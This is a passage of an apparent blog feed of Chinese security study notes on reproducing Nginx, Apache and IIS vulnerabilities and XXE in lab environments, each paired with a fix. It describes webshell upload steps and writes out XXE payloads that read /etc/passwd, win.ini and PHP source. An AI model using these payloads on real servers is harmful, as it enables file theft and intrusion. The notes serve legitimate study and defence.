        <content type="html"><![CDATA[<h2 id="Nginx-系列漏洞复现"><a href="#Nginx-系列漏洞复现" class="headerlink" title="Nginx -系列漏洞复现"></a><strong>Nginx -系列漏洞复现</strong></h2><p>IIS是微软开发的web服务器，需要收费，主要用来跑asp.net asp php，只能在windows下运行。</p><p>Apache是Apache基金会的web服务器，免费，只支持静态界面，是html容器，应用范围广泛。</p><p>Tomcat是Apache基金会的java服务器，主要用来跑jsp php python等</p><p>Ngnix是反向代理服务器，它是代理，本身并不执行，是个传话筒，把用户提交的请求转发给web服务器，再把web服务器的结果转发给用户。为了提高性能，启用反向代理，实际的web服务器可以有很多台，而Ngnix放在前面，可以把这些web服务器整合成一个虚拟的更强大的服务</p><h4 id="Nginx-文件解析漏洞"><a href="#Nginx-文件解析漏洞" class="headerlink" title="Nginx-文件解析漏洞"></a>Nginx-文件解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​          nginx是一款高性能的web服务器，使用非常广泛，其不仅经常被用作反向代理，也可以非常好的支持PHP的运行。80sec发现其中存在一个较为严重的安全问题，默认情况下可能导致服务器错误的将任何类型的文件以PHP的方式进行解析，这将导致严重的安全问题，使得恶意的攻击者可能攻陷支持php的nginx服务器。<br>​          漏洞格式：test.jpg/a.php</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先打开phpstudy切换版本为nginx-5.2.17</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131115008.png)</p><p>我们可以从phpstudy下的nginx的index.html复制到网站根目录下</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131115049.png)</p><p>我们从本地打开网站的该页面即可看到nginx的欢迎页面</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131115112.png)</p><p>我们在C盘根目录下新建shell.php写入如下代码。然后任意选择一张图片。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131115532.png)</p><p>我们在命令行下选择使用管理员打开命令行，然后使用copy命令制作图片马。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131120017.png)</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131120033.png)</p><p>然后我们在本地网站根目录下创建文件上传页面。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131121704.png)</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131121729.png" style="zoom:50%;" /><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131121803.png" style="zoom:50%;" /><p>我们将我们刚刚制作好的图片马进行上传，发现提示上传成功。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131122629.png)</p><p>我们在本地网站根目录下进行查看</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131122944.png)</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131123013.png" style="zoom:67%;" /><p>我们在shell.jpg后添加/a.php或/b.php后发现可以成功解析。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131123036.png" style="zoom:67%;" /><h5 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p> 将php.ini文件中的cgi.fix_pathinfo的值设为0，这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404.</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131123518.png)</p><h4 id="nginx-目录遍历漏洞"><a href="#nginx-目录遍历漏洞" class="headerlink" title="nginx-目录遍历漏洞"></a>nginx-目录遍历漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞。使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以是web根目录以外的文件），甚至执行系统命令。</p><p>​      程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先需要将nginx的配置文件nginx.conf中autoindex off；改为on;</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131182922.png)</p><p>我们任意访问网站根目录下的某一文件夹，即可看到该目录下的所有文件，出现目录遍历漏洞。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131183226.png)</p><h5 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p>将nginx的配置文件nginx.conf下改为autoindex   off即可；</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200131182922.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IIS中间件漏洞</title>
      <link href="/2020/04/03/iis-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/iis-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="IIS中间件漏洞复现"><a href="#IIS中间件漏洞复现" class="headerlink" title="IIS中间件漏洞复现"></a>IIS中间件漏洞复现</h2><p>[TOC]</p><h4 id="IIS-put漏洞"><a href="#IIS-put漏洞" class="headerlink" title="IIS-put漏洞"></a>IIS-put漏洞</h4><p><strong>什么是IIS？</strong></p><p>  IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​      WebDAV （Web-based Distributed Authoring and Versioning） 是一种HTTP1.1的扩展协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。可以像在操作本地文件夹一样操作服务器上的文件夹，该扩展也存在缺陷，可以被恶意攻击者利用，直接上传恶意文件。</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>1.准备过程：</p><p>安装windows server 2003版本，准备iis写入工具，下载IIS6.0版本</p><p>2.复现过程：</p><p>我们首先在虚拟机中打开win server 2003 版本。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118185950.png" style="zoom:50%;" /><p>之后我们安装IIS6.0服务,进入网站配置界面</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118190925.png" style="zoom:50%;" /><p>打开webDAV服务配置  Active Server pages(允许解析asp文件)，提供文件写入权限。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118191122.png" style="zoom:33%;" /><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118191318.png" style="zoom: 50%;" /><p>我们尝试在物理机打开网站</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118191510.png)</p><p>说明服务已开启。</p><p>我们打开iis写入工具。尝试写入test.txt文件。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118192007.png" style="zoom:50%;" /><p>发现提示“您未被授予查看该页”。</p><p>后来发现未开启来宾用户足够的权限</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118192257.png" style="zoom:50%;" /><p>我们再次尝试。成功写入。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118192408.png" style="zoom:50%;" /><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118192500.png" style="zoom:50%;" /><p>我们新建一个asp一句话木马文件，先命名为shell.txt,写入网站根目录下。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118193312.png)</p><p>然后使用iiswrite的mv功能。首先我们需开启网站主目录下的脚本资源访问功能</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118112701.png)</p><p>然后将根目录下的shell.txt修改为shell.asp</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118112855.png" style="zoom: 80%;" /><p>之后我们使用菜刀连接即可。</p><h4 id="IIS-短文件名猜解漏洞"><a href="#IIS-短文件名猜解漏洞" class="headerlink" title="IIS-短文件名猜解漏洞"></a>IIS-短文件名猜解漏洞</h4><p><strong>什么是短文件名？</strong></p><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件(和文件夹)生成对应的window 8.3短文件名。</p><h5 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>  为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。<br> 在Windows下查看对应的短文件名，可以使用命令 <code>dir /x</code></p><p>​     攻击者使用通配符*和？发送一个请求到IIS，当IIS接收到一个文件路径中包含“~”请求时，返回的HTTP状态码和错误信息不同。基于这个特点，可以根据HTTP的响应区分一个可用或者不可用的文件。访问构造的某个存在的短文件名，会返回404；访问构造的某个不存在的短文件名，会返回400（报错页面）。</p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们进入win server 2003的网站根目录下。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118194442.png" style="zoom:67%;" /><p>在根目录下新建多个超过8个字符的文件名</p><p>​                   ![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118144312.png)</p><p>我们在命令提示符使用 dir c:/x，即可看到我们创建的文件的短文件名。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200118144400.png)</p><p>我们在物理机上访问该网站并使用通配符猜解文件名。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200202204523.png)</p><p>可以看到网页回显404，说明网站根目录存在所猜解的文件名。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200202204745.png" style="zoom:67%;" /><p>我们访问不存在的文件会报错。</p><h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol><li>升级.net framework</li><li>修改注册表键值：</li></ol><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200202205239.png)</p><p>将数值数据改为1，1代表不创建短文件名格式。修改完成后，需要重启系统生效。</p><h4 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS-解析漏洞"></a>IIS-解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>在网站下建立文件夹的名称中以.asp或.asa等作为后缀的文件夹,其目录内任何扩展名的文件都被IIS当作asp可执行文件去解析并执行.</p><p>举例：/xx.asp/xx.jpg为xx.asp目录下存在xx.jpg文件,但将会被IIS解析成asp文件去执行,与原文件的后缀无关.</p><h5 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们在www下新建一个test.asp文件夹和test.jpg图像文件</p><p>在图像文件中写入任意字符。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200202210506.png)</p><p>我们直接访问图像文件，发现无法成功解析。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200202210532.png)</p><p>我们再将图片文件放入asp文件夹下重新尝试访问</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200202210636.png)</p><p>发现网站将该文件解析成了asp文件进而成功执行。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200202210706.png)</p><h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ul><li>取消网站后台新建目录的功能，不允许新建目录。</li><li>对新建目录文件名进行过滤，不允许新建包含.的文件夹。</li></ul><h4 id="IIS远程代码执行"><a href="#IIS远程代码执行" class="headerlink" title="IIS远程代码执行"></a>IIS远程代码执行</h4><h5 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​    在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p><h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>1.漏洞环境搭建：</p><p>在windows server 2003 r2 32位上安装iis6.0</p><p>2.触发漏洞：</p><p>在本地执行exp</p><p><img src="D:%5Cblog%5Csource_posts%5CIIS%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%5C4-2-1.png" alt=""></p><p>执行成功后，服务器弹出计算器。</p><p><img src="D:%5Cblog%5Csource_posts%5CIIS%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%5C4-2-2.png" alt=""></p><h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.关闭webDAV服务</p><p>2.使用相关防护设备</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Apachhe中间件漏洞</title>
      <link href="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/02/apachhe-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="Apache中间件漏洞复现"><a href="#Apache中间件漏洞复现" class="headerlink" title="Apache中间件漏洞复现"></a>Apache中间件漏洞复现</h3><h4 id="Apache-文件解析漏洞"><a href="#Apache-文件解析漏洞" class="headerlink" title="Apache 文件解析漏洞"></a>Apache 文件解析漏洞</h4><h5 id="apache简介"><a href="#apache简介" class="headerlink" title="apache简介"></a>apache简介</h5><p>​       Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩展，将Perl/Python等解释器编译到服务器中。</p><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户的配置问题。Apache文件解析漏洞涉及到一个解析文件的特性。Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别，则继续向左识别，发现后缀是php,交给php处理这个文件。</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先打开phpstudy，切换apache版本为5.2.17.</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201102616.png" alt=""></p><p>我们在本地网站根目录下新建文本文档写入任意字母。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104725.png" alt=""></p><p>我们尝试修改后缀名为不存在的.456，然后在本地访问该文件</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104035.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104057.png" alt=""></p><p>发现仍然可以成功读取</p><p>我们继续修改后缀名</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104123.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104141.png" alt=""></p><p>发现服务器仍然可以解析</p><p>我们修改为.php.360尝试，依然可以成功解析。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104210.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104231.png" alt=""></p><p>那么我们在文件上传时就可以利用Apache的解析特性进行绕过</p><h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为<em>.php.\</em>的访问权限：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">".(php.|php3.|php4|php5.)"</span><span class="token punctuation">></span></span></span>Order Deny<span class="token punctuation">,</span>AllowDeny from all<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">></span></span></span></code></pre><h4 id="Apache-目录遍历漏洞"><a href="#Apache-目录遍历漏洞" class="headerlink" title="Apache 目录遍历漏洞"></a>Apache 目录遍历漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p> 目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞。使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以是web根目录以外的文件），甚至执行系统命令。</p><p>​      程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们打开phpstudy.</p><p>然后在本地网站根目录下新建多个子目录</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201112807.png" alt=""></p><p>我们此时访问网站</p><p><img src="18d8bc3eb13533fa38aa502b974b3d1a41345b31.jpg" alt=""></p><p>可以看到很明显的index  of标志,说明此时存在目录遍历</p><p>我们可以在谷歌中通过 intitle ：index of来帮我们寻找目录遍历漏洞</p><h5 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p>在httpd.conf文件中找到Options + Indexes + FollowSymLinks + ExecCGI并修改成</p><p>Options -Indexes + FollowSymLinks + ExecCGI并保存（把+修改为-）</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201114345.png" alt=""></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞学习</title>
      <link href="/2020/04/02/xxe-lou-dong-xue-xi/"/>
      <url>/2020/04/02/xxe-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="XXE漏洞学习笔记-靶场实战"><a href="#XXE漏洞学习笔记-靶场实战" class="headerlink" title="XXE漏洞学习笔记+靶场实战"></a>XXE漏洞学习笔记+靶场实战</h2><p>[TOC]</p><h4 id="一、关于XML和XXE的基础知识"><a href="#一、关于XML和XXE的基础知识" class="headerlink" title="一、关于XML和XXE的基础知识"></a>一、关于XML和XXE的基础知识</h4><p>​     XXE全称XML,也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。要想搞懂XXE，一定要先了解XML语法规则和外部实体的定义及调用形式。</p><h5 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h5><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素。XML语法规则：</p><p>1.所有的XML元素都必须有一个关闭标签；</p><p>2.XML标签对大小写敏感。</p><p>3.XML必须正确嵌套。</p><p>4.XML属性值必须加“”。</p><ul><li>XML被设计为传输和存储数据，其焦点是数据的内容。</li><li>HTML被设计用来显示数据，其焦点是数据的外观。</li></ul><p><strong>XML基本文档结构</strong></p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--XML声明--></span><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token comment" spellcheck="true">&lt;!--DTD，这部分可选的--></span>          <span class="token doctype">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY ></span>&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><span class="token comment" spellcheck="true">&lt;!--文档元素--></span>                                                                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre><h5 id="xml元素介绍"><a href="#xml元素介绍" class="headerlink" title="xml元素介绍"></a>xml元素介绍</h5><p>XML元素是指从开始标签直到结束标签的部分。每个元素又有对应的属性，XML属性必须加引号。</p><p>注意：</p><ul><li><p>XML文档必须有一个根元素。</p></li><li><p>XML元素必须有一个关闭标签</p></li><li><p>XML标签对大小写敏感</p></li><li><p>XML元素必须被正确的嵌套。</p></li><li><p>XML属性值必须加引号</p></li></ul><p><img src="QQ%E6%88%AA%E5%9B%BE20200117181423.png" alt=""></p><h5 id="XML-DTD介绍"><a href="#XML-DTD介绍" class="headerlink" title="XML DTD介绍"></a>XML DTD介绍</h5><p>DTD文档类型定义，约束了xml文档的结构。拥有正确语法的XML被称为“形式良好”的XML，通过DTD验证约束XML是“合法”的XML。</p><img src="QQ截图20200117183256.png" style="zoom: 67%;" /><h5 id="DTD含义"><a href="#DTD含义" class="headerlink" title="DTD含义"></a>DTD含义</h5><p>XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD文档类型定义的东西控制的。</p><p>DTD用来描述xml文档的结构，一个DTD文档包含：</p><ul><li>元素的定义规则</li><li>元素之间的关系规则</li><li>属性的定义规则</li></ul><p>DTD可被成行地声明于xml文档中，也可作为一个外部引用。</p><h5 id="内部的DOCTYPE声明"><a href="#内部的DOCTYPE声明" class="headerlink" title="内部的DOCTYPE声明"></a>内部的DOCTYPE声明</h5><p>内部声明DTD类型声明：<!DOCTYPE 根元素 [子元素声明]></p><img src="QQ截图20200117195250.png" style="zoom:67%;" /><h5 id="引用外部实体："><a href="#引用外部实体：" class="headerlink" title="引用外部实体："></a>引用外部实体：</h5><p>我们主要关注XML外部实体的定义和调用方式：</p><!ENTITY 实体名称 SYSTEM "URL"><p> </p><p><strong>实例：</strong></p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root-element SYSTEM "test.dtd"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>you<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>are<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>very<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>good!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre><p>test.dtd</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMNET</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">head</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span></code></pre><p>- PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p><h5 id="DTD实体介绍"><a href="#DTD实体介绍" class="headerlink" title="DTD实体介绍"></a>DTD实体介绍</h5><p>实体定义：实体是用于定义引用普通文本或者特殊字符的快捷方式的变量。</p><p>在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。除外部参数实体引用以字符（%）开始外，其他参数实体都以字符(&amp;)开始，以字符(;)结束。</p><h5 id="内部实体："><a href="#内部实体：" class="headerlink" title="内部实体："></a>内部实体：</h5><!ENTITY 实体名称 ”实体的值"><p><img src="QQ%E6%88%AA%E5%9B%BE20200117200803.png" alt=""></p><h5 id="外部实体："><a href="#外部实体：" class="headerlink" title="外部实体："></a>外部实体：</h5><!ENTITY 实体名称 SYSTEM "URl/URL"><img src="QQ截图20200117201148.png"  /><h5 id="外部参数实体："><a href="#外部参数实体：" class="headerlink" title="外部参数实体："></a>外部参数实体：</h5><!ENTITY % 实体名 “实体内容"><p>该类型的实体用“%”字符声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容：</p><p><strong>示例：</strong></p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE demo [            &lt;!ENTITY % first "Hello"></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">second</span> <span class="token attr-name">"&amp;first;_world"</span><span class="token punctuation">></span></span>%second;]></code></pre><p>​                                </p><h4 id="XML注入漏洞（XXE漏洞）"><a href="#XML注入漏洞（XXE漏洞）" class="headerlink" title="XML注入漏洞（XXE漏洞）"></a>XML注入漏洞（XXE漏洞）</h4><h5 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h5><p>XXE漏洞全称XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的XML文件进行过滤，导致可以上传恶意的XML文件。</p><p>通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p><h5 id="常见的XXE漏洞类型"><a href="#常见的XXE漏洞类型" class="headerlink" title="常见的XXE漏洞类型"></a>常见的XXE漏洞类型</h5><ul><li><strong>基础的XXE注入</strong>——外部实体注入本地DTD</li><li><strong>基于盲注的XXE注入</strong>——xml解析器在响应中不显示任何错误。、</li><li><strong>基于错误的XXE注入</strong>——成功解析之后，XML解析器始终显示SAME响应。（您的消息已被接收）。因此，我们可能希望解析器将文件的内容“打印”到错误响应中。</li></ul><h5 id="XXE漏洞危害"><a href="#XXE漏洞危害" class="headerlink" title="XXE漏洞危害"></a>XXE漏洞危害</h5><ul><li>任意文件读取</li><li>探测内网地址</li><li>通过DTD窃取文件</li><li>远程代码执行</li></ul><h5 id="XXE漏洞的测试方法"><a href="#XXE漏洞的测试方法" class="headerlink" title="XXE漏洞的测试方法"></a>XXE漏洞的测试方法</h5><p>发现post请求的接口的时候，可以这样试试：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY test &quot;THIS IS A STRING!&quot;&gt; ]&gt; &lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>如果发现了一个错误：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a [&lt;!ENTITY test &quot;nice string bro&quot;&gt;] &gt;&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>说明能够解析，试试读文件：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;] &gt;&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>或者用php伪协议：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a [&lt;!ENTITY test SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;] &gt;&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>得到的结国再base64解码即可。</p><h5 id="XXE漏洞的防御"><a href="#XXE漏洞的防御" class="headerlink" title="XXE漏洞的防御"></a>XXE漏洞的防御</h5><p>方案：使用开发语言提供的禁用外部实体的方法。</p><p><strong>1.PHP</strong>：</p><p>libxml_disable_entity_loader(true);</p><p><strong>2.JAVA:</strong></p><p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</p><p>dbf.setExpandEntityReferences(false);</p><p><strong>3.Python：</strong></p><p>from lxml import etree</p><p>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><h3 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h3><h4 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" 